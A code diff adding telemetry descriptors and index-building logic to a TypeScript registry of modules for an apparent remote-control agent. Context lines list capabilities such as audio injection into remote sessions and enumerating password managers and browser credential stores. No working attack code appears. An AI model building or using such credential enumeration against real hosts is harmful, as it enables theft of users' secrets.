@@ -4,12 +4,19 @@ export interface AgentModuleCapability {
   description: string;
 }
 
+export interface AgentModuleTelemetry {
+  id: string;
+  name: string;
+  description: string;
+}
+
 export interface AgentModuleDefinition {
   id: string;
   title: string;
   description: string;
   commands: string[];
   capabilities: AgentModuleCapability[];
+  telemetry?: AgentModuleTelemetry[];
 }
 
 export const agentModules: AgentModuleDefinition[] = [
@@ -51,6 +58,14 @@ export const agentModules: AgentModuleDefinition[] = [
           "Collect frame quality and adaptive bitrate metrics for dashboards.",
       },
     ],
+    telemetry: [
+      {
+        id: "remote-desktop.metrics",
+        name: "Performance telemetry",
+        description:
+          "Emit adaptive streaming metrics describing encoder performance and transport health.",
+      },
+    ],
   },
   {
     id: "audio-control",
@@ -70,6 +85,14 @@ export const agentModules: AgentModuleDefinition[] = [
         name: "Audio injection",
         description:
           "Inject operator-provided audio streams into the remote session.",
+      },
+    ],
+    telemetry: [
+      {
+        id: "audio.telemetry",
+        name: "Audio telemetry",
+        description:
+          "Report capture bridge levels, buffer health, and device availability to the controller.",
       },
     ],
   },
@@ -166,6 +189,14 @@ export const agentModules: AgentModuleDefinition[] = [
           "Enumerate installed password managers and browser credential stores.",
       },
     ],
+    telemetry: [
+      {
+        id: "system-info.telemetry",
+        name: "System telemetry",
+        description:
+          "Stream host performance counters, thermal states, and resource utilization snapshots.",
+      },
+    ],
   },
   {
     id: "notes",
@@ -198,6 +229,11 @@ type AgentModuleCapabilityRecord = AgentModuleCapability & {
   moduleTitle: string;
 };
 
+type AgentModuleTelemetryRecord = AgentModuleTelemetry & {
+  moduleId: string;
+  moduleTitle: string;
+};
+
 const capabilityEntries: [string, AgentModuleCapabilityRecord][] = [];
 
 for (const module of agentModules) {
@@ -220,4 +256,31 @@ export const agentModuleCapabilityIndex: ReadonlyMap<
 
 export const agentModuleCapabilityIds: ReadonlySet<string> = new Set(
   capabilityEntries.map(([id]) => id),
+);
+
+const telemetryEntries: [string, AgentModuleTelemetryRecord][] = [];
+
+for (const module of agentModules) {
+  const telemetry = Array.isArray(module.telemetry)
+    ? module.telemetry
+    : [];
+  for (const descriptor of telemetry) {
+    telemetryEntries.push([
+      descriptor.id,
+      {
+        ...descriptor,
+        moduleId: module.id,
+        moduleTitle: module.title,
+      },
+    ]);
+  }
+}
+
+export const agentModuleTelemetryIndex: ReadonlyMap<
+  string,
+  AgentModuleTelemetryRecord
+> = new Map(telemetryEntries);
+
+export const agentModuleTelemetryIds: ReadonlySet<string> = new Set(
+  telemetryEntries.map(([id]) => id),
 );
